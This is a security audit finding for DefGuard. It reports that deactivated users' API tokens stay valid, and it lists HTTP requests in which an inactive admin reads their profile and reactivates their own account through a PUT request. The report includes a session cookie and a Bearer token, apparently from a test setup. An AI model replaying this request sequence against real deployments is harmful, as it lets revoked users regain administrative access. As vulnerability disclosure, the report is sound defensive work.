---
title: "DG25-3: API Tokens of inactive users are not being invalidated"
severity: Medium
cvss_score: 5.4
cvss_string: "/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"
issue_link: https://github.com/DefGuard/defguard/issues/1509
status: Completed
---

### Technical details

User testtest has administrative rights but is inactive:

**Request:**\
\
**GET** /api/v1/user/testtest HTTP/2\
**Host:** defguard.dvpnsec.net\
**Cookie:** defguard_session=3TsmOvtETUdRVedNYJDJvnHH\
\
\
**Response:**\
\
**HTTP/2** 200 OK\
**Alt-Svc:** h3=\":443\"; ma=2592000\
**Content-Type:** application/json\
**Date:** Mon, 04 Aug 2025 11:52:29 GMT\
**Server:** Caddy\
**X-Defguard-Version:** 1.5.0-a29ac10\
**Content-Length:** 363\
\

```json
{
  "devices ": [],
  "security_keys ": [],
  "user ": {
    "authorized_apps ": [],
    "email ": "phtest2@isec.pl ",
    "email_mfa_enabled ": false,
    "enrolled ": true,
    "first_name ": "Test1xxxx ",
    "groups ": [
      "admin "
    ],
    "id ": 2,
    "is_active ": false,
    "is_admin ": true,
    "last_name ": "Test ",
    "ldap_pass_requires_change ": false,
    "mfa_enabled ": false,
    "mfa_method ": "None ",
    "phone ": " ",
    "totp_enabled ": false,
    "username ": "testtest "
  }
}
```

Nonetheless, this user still can access the DefGuard REST via their API
token:

**Request:**\
\
**GET** /api/v1/me HTTP/2\
**Host:** defguard.dvpnsec.net\
**Authorization:** Bearer dg-ArCeAQ9klHfs5YhekQf4ySkIUXUoT4wF\
\
\
**Response:**\
\
**HTTP/2** 200 OK\
**Alt-Svc:** h3=\":443\"; ma=2592000\
**Content-Type:** application/json\
**Date:** Mon, 04 Aug 2025 11:53:37 GMT\
**Server:** Caddy\
**X-Defguard-Version:** 1.5.0-a29ac10\
**Content-Length:** 322\
\

```json
{
  "authorized_apps ": [],
  "email ": "phtest2@isec.pl ",
  "email_mfa_enabled ": false,
  "enrolled ": true,
  "first_name ": "Test1xxxx ",
  "groups ": [
    "admin "
  ],
  "id ": 2,
  "is_active ": false,
  "is_admin ": true,
  "last_name ": "Test ",
  "ldap_pass_requires_change ": false,
  "mfa_enabled ": false,
  "mfa_method ": "None ",
  "phone ": " ",
  "totp_enabled ": false,
  "username ": "testtest "
}
```
Moreover, the deactivated user can use this API token to activate their
account:

**Request:**\
\
**PUT** /api/v1/user/testtest HTTP/2\
**Host:** defguard.dvpnsec.net\
**Authorization:** Bearer dg-ArCeAQ9klHfs5YhekQf4ySkIUXUoT4wF\
**Content-Length:** 321\
**User-Agent:** Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36\
**Content-Type:** application/json\
```json 
{
  "authorized_apps ": [],
  "email ": "phtest2@isec.pl ",
  "email_mfa_enabled ": false,
  "enrolled ": true,
  "first_name ": "Test1xxxx ",
  "groups ": [
    "admin "
  ],
  "id ": 2,
  "is_active ": true,
  "is_admin ": true,
  "last_name ": "Test ",
  "ldap_pass_requires_change ": false,
  "mfa_enabled ": false,
  "mfa_method ": "None ",
  "phone ": " ",
  "totp_enabled ": false,
  "username ": "testtest "
}
 ```
\
**Response:**\
\
**HTTP/2** 200 OK\
**Alt-Svc:** h3=\":443\"; ma=2592000\
**Content-Type:** application/json\
**Date:** Mon, 04 Aug 2025 11:57:41 GMT\
**Server:** Caddy\
**X-Defguard-Version:** 1.5.0-a29ac10\
**Content-Length:** 4\
\
null

### Recommendations

Whenever user is being deactivates - deactivate their API tokens too.
